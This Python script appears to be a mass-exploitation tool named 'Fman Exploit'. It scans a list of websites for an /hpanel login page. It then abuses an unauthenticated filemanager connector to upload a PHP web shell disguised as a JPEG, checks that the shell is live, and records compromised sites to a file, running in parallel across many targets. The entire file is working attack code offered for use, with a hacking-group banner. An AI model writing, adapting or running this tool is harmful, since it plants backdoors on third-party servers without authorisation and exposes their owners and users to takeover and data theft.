import argparse, sys, ctypes, platform, os, time
import os, multiprocessing
import cloudscraper
from colorama import Fore, Back, Style
from datetime import date


def exploiter(site):

    scrap = cloudscraper.create_scraper(
    browser = {
        'browser' : 'chrome',
        'platform' : 'darwin',
        'mobile': False
    }
)

    vuln = "/hpanel/filemanager/connectors/php/filemanager.php"
    fname = "eagle.php"
    path = "/images/subcate/"
    headers = {"User-Agent":"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    "X-Requested-With":"XMLHttpRequest"
    }
    payload = {'newfile': (fname, open("script/uploader.txt","rb"),'image/jpeg')}
    reqdata = {
        "mode":"add",
        "currentpath":"/images/subcate/",
        "filepath":"up.txt",
        "upload":"Upload"
    }

    att = site + vuln
    chk = site + path + fname

    gos1 = scrap.post(att,data=reqdata,files=payload,headers=headers)
    gos2 = scrap.get(chk,timeout=15)

    if "Eagle1337" in gos2.text:
        print(Style.BRIGHT + Fore.GREEN+"[+] Shell for {} uploaded!...".format(site+"/"))
        saving(chk)



def finder(site):
    s = cloudscraper.create_scraper(
    browser = {
        'browser' : 'chrome',
        'platform' : 'darwin',
        'mobile': False
    }
)

    st = "http://"+site+"/hpanel/index.php"
    
    try:
        cek = s.get(st,timeout=30)
        #print(site)
        if cek.status_code==200:
            if "Login" in cek.text:
               print(Style.BRIGHT + Fore.BLUE+"FOUND -> "+st)
               ns = "http://"+site
               exploiter(ns)
               #txtCheck(ns)
               
    except:
        try:
            st2 = "https://"+site+"/hpanel/index.php"
            cek2 = s.get(st2,timeout=30)
            if cek2.status_code==200 and "Login" in cek2.text:
                print(Style.BRIGHT + Fore.BLUE+"FOUND -> "+st2)
                ns2 = "https://"+site
                exploiter(ns2)
                #txtCheck(ns2)
                
        except:
            print(Style.BRIGHT + Fore.RED+"Connection Error!")

def sites(txt):
    try:
        lines = open(txt,'r').readlines()
        return lines
    except FileNotFoundError:
        print(Style.BRIGHT + Fore.RED+"File not found!")
        os._exit(0)


def saving(site):
    sv = open("vuln.txt","a")
    sv.write(site+"\n")
    sv.close()

    
def start():
    proc = []
    parser = argparse.ArgumentParser()
    parser.add_argument('--w',type=str, help='Web list filename (eg: web.txt)',default='website.txt', required=True)
    args = parser.parse_args()
    lines = sites(args.w)
    for line in lines:
        site = line.replace('\n','')
        proc.append(multiprocessing.Process(target=finder,args=(site,)))
    
    for ps in proc:
        try:
            ps.start()
        except KeyboardInterrupt:
            sys.exit(0)
        
    for ps in proc:
        try:
            ps.join()
        except KeyboardInterrupt:
            sys.exit(0)
        
if __name__ == '__main__':
    today = date.today()
    d2 = today.strftime("%B %d, %Y")

    if platform.system()=='Linux':
        os.system('clear')
        sys.stdout.write("\x1b]2;Fman Exploit {}\x07".format(d2))
    else:
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'Fman Exploit | {d2}')

    print(f"""{Style.BRIGHT + Fore.RED}
    ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
    ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
    ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
    ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
                                                                                                                
    {Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
    {Style.BRIGHT + Fore.YELLOW}  
                                                    Coded by Eagle Eye
                                                   Filemanager Exploiter
                                        https://dragonforce.io | Telegram: dragonforceio
                                    Get Started With (pip install -r requirements.txt)                                                                                            

    {Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
    """)

    start()
    
    print(Style.BRIGHT + Fore.WHITE+"Saved in vuln.txt")